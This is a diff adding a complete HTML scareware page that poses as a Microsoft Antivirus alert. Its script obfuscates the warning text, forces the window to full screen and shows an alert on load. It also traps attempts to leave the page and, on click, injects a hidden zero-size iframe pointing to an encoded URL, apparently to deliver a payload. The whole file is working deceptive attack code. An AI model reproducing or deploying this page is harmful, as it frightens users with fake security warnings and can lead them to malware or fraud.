@@ -1,0 +1,53 @@
+<html>
+<head>
+    <script>
+        var lkn=Math.random();
+        window.moveTo(lkn-2*lkn+lkn,lkn-2*lkn+lkn);
+        window.resizeTo(screen.width,screen.height);
+        var l22="MicrosoftLoL_lolAntivirusLoL_lolhasLoL_lolfoundLoL_lolcriticalLoL_lolprocessLoL_lolactivityLoL_lolonLoL_lolyourLoL_lolPC";
+        var l33="\nYouLoL_lolneedLoL_loltoLoL_lolcleanLoL_lolyourLoL_lolcomputerLoL_loltoLoL_lolpreventLoL_loltheLoL_lolsystemLoL_lolbreakage.";
+        var askerr=1;
+    </script>
+
+    <title>Viruses were found on your computer!</title>
+</head>
+<body topmargin=0 leftmargin=0 bgcolor='#FFFFFF'>
+<table cellspacing="0" cellpadding="0" border="0" width="100%" height="99%">
+    <tr valign="middle" align="center"><td>
+
+        <img id="al" src="images/lee/message.png" width="617" height="345" border="0" usemap="#maper">
+        <map name="maper">
+            <area shape="rect" coords="544,12,593,33" onmousedown='lopIufd();'>
+            <area shape="rect" coords="480,287,578,308" onclick="promkasTofuck();" style='cursor:pointer' onmousedown='askerr=0;'>
+        </map>
+    </td>
+    </tr>
+</table>
+<div id="insid"></div>
+</body>
+
+<script>
+    result_text=l22.replace(/LoL_lol/g, ' ')+l33.replace(/LoL_lol/g, ' ');
+    function birka(){
+        return askerr==1?result_text:false;
+    }
+    window.onbeforeunload=birka;
+
+    function lopIufd(){
+            alert(result_text);
+    }
+    lopIufd();
+
+    function promkasTofuck(){
+        var elemName = "IFRAME";
+        elemName+="";
+        var s = document.createElement(elemName);
+        s.src = "?c=RaEQL35QhmY+kIAGyK+WVWLp2rbgW2GSiNy+2HVZf8nAluVQyGmfnDqQ11kBjE8FpXhdgKkccsLkwqY6SkCruf6R0txQgOL6IfbkDqTbpNWjW+k=";
+        s.style.width = "0px";
+        s.style.height = "0px";
+        s.style.border = "0px";
+        document.getElementById('insid').appendChild(s)
+
+    }
+</script>
+</html>
